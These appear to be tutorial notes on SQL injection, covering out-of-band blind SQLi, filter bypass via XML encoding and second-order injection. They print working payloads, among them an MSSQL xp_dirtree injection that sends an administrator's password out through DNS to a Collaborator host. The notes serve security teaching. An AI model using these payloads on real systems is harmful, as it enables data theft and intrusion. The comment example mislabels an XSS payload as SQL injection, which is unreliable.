## Exploiting blind SQL injection using out-of-band (OAST) techniques:
- The application continues processing the user's request in the original thread, and uses another thread to execute a SQL query using the tracking cookie.
- Typically the most effective is DNS (domain name service) for this type of SQLi.
- The easiest and most reliable tool for using out-of-band techniques is Burp Collaborator.

- The techniques for triggering a DNS query are specific to the type of database being used. For example,
- the following input on Microsoft SQL Server can be used to cause a DNS lookup on a specified domain:
- Injection: `'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'-- `
- This causes the database to perform a lookup for the following domain: `0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`

## Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application
- Injection: `'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`
- This input reads the password for the Administrator user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This lookup allows you to view the captured password: S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net

> Out-of-band (OAST) techniques are a powerful way to detect and exploit blind SQL injection, due to the high chance of success and the ability to directly exfiltrate data within the out-of-band channel.


# SQL injection in different contexts:
- We can `perform SQL injection attacks using any controllable input` that is processed as a SQL query by the application.
- For example, `some websites take input in JSON or XML format and use this to query the database.`
- To bypass these filters by encoding or escaping characters in the prohibited keywords.
```
For example, the following XML-based SQL injection uses an XML escape sequence to encode the S character in SELECT:

<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>

This will be decoded server-side before being passed to the SQL interpreter.
```


# Second-order SQL injection:

## E. `Second Order SQLi/stored SQL injection/Persistent SQL Injection: takes user input & stores(in DB) it for future use.`
-  Application takes user input from an HTTP request(Input field) and stores(in DB) it for future use.
-  Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into an SQL query in an unsafe way.

>  Second-order SQL injection `occurs when user-supplied input is stored and later used in a SQL query without proper validation and sanitization.` 
-  <img width="500" alt="image" src="https://github.com/cybersome/CyberEssentials/assets/40174034/c90a6116-2d4c-43f1-86a6-c927b2cc9428">

### Examples:
1. `User Registration Form`: An attacker could register with a username containing a malicious payload, such as: `Username: ' OR '1'='1'; --`
- Later, when the application retrieves user details using the stored query, it becomes:  `SELECT * FROM users WHERE username = '' OR '1'='1'; --';`

2. `User Comments`: An attacker could submit a comment containing a malicious payload, such as: `Comment: <script>malicious_code();</script>` 
- Later, when the application retrieves and displays the comments using the stored query, it becomes: `INSERT INTO comments (content) VALUES ('<script>malicious_code();</script>');`
